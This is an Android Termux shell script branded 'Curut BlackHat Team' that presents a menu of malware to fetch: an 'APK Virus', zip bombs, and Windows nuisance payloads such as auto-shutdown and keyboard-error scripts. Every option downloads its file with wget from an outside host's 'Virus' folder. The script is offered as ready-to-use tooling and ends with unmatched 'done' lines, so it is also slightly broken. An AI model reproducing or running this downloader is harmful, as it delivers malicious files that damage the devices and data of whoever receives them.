#!/bin/bash
#version 1.0

clear
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"

echo " "
echo " "
cd /storage/emulated/0/Virus
echo " "
echo " "
echo " "
echo "                 Curut BlackHat Team             " | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[       Tools By Moreno77       ]=====>" | lolcat
echo "    <=====[  Concact Me : +6285606753071  ]=====>" | lolcat
echo "    <=====[   Youtube.com/c/DarkCurut08   ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat
sleep 1
###################################################
# CTRL + C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
clear
cd /data/data/com.termux/files/home
echo "Autor : Moreno77" | lolcat
echo "WhatsApp : +6285606753071" | lolcat
echo "Channel Youtube : youtube.com/c/DarkCurut08" | lolcat
figlet -f slant "Moreno77" | lolcat
echo '[!] Selamat Bertemu Lain Waktu...' | lolcat
exit
}

echo "=======================================================" | lolcat
echo " 1. APK Virus" | lolcat
echo " 2. Bom Zip V.1" | lolcat
echo " 3. Bom Zip V.2" | lolcat
echo " 4. CD/DVD Room Eror   [ For Windows ]" | lolcat
echo " 5. Bom Zip V.1        [ For Windows ]" | lolcat
echo " 6. Bom Zip V.2        [ For Windows ]" | lolcat
echo " 7. Auto ShutDown v.1  [ For Windows ]" | lolcat
echo " 8. Auto ShutDown v.2  [ For Windows ]" | lolcat
echo " 9. Auto Open Notepad  [ For Windows ]" | lolcat
echo " 10. BackSpace Eror    [ For Windows ]" | lolcat
echo " 11. CapsLock Eror     [ For Windows ]" | lolcat
echo " 00. Exit" | lolcat
echo "=======================================================" | lolcat
echo $green "╭─[ Silahkan Di Pilih ]"
read -p " ╰─# " pil;

case $pil in

00) cd /data/data/com.termux/files/home
echo "Autor : Moreno77" | lolcat
echo "WhatsApp : +6285606753071" | lolcat
echo "Channel Youtube : youtube.com/c/DarkCurut08" | lolcat
figlet -f slant "Moreno77" | lolcat
echo '[!] Selamat Bertemu Lain Waktu...' | lolcat
exit
;;

1) wget http://gogr4m.tk/Virus/Elite.apk
echo " [!] Download Success........" | lolcat
exit
;;

2) wget http://gogr4m.tk/Virus/Bom_zip.zip
echo " [!] Download Success........" | lolcat
echo " [!] Password Virus = 42" | lolcat
exit
;;

3) wget http://gogr4m.tk/Virus/Bom_zip2.zip
echo " [!] Download Success........" | lolcat
exit
;;


4) wget http://gogr4m.tk/Virus/eror-cd-room.zip
echo " [!] Download Success........" | lolcat
exit
;;


5) wget http://gogr4m.tk/Virus/Bom_zip_pc.zip
echo " [!] Download Success........" | lolcat
exit
;;

6) wget http://gogr4m.tk/Virus/Bom_Zip_pc2.zip
echo " [!] Download Success........" | lolcat
exit
;;

7) wget http://gogr4m.tk/Virus/ShutDown1.zip
echo " [!] Download Success........" | lolcat
exit
;;

8) wget http://gogr4m.tk/Virus/ShutDown2.zip
echo " [!] Download Success........" | lolcat
exit
;;

9) wget http://gogr4m.tk/Virus/Notepad.bat
echo " [!] Download Success........" | lolcat
exit
;;

10) wget http://gogr4m.tk/Virus/Backspace.zip
echo " [!] Download Success........" | lolcat
exit
;;

11) wget http://gogr4m.tk/Virus/caps-lock.zip
echo " [!] Download Success........" | lolcat
exit
;;
esac
done
done
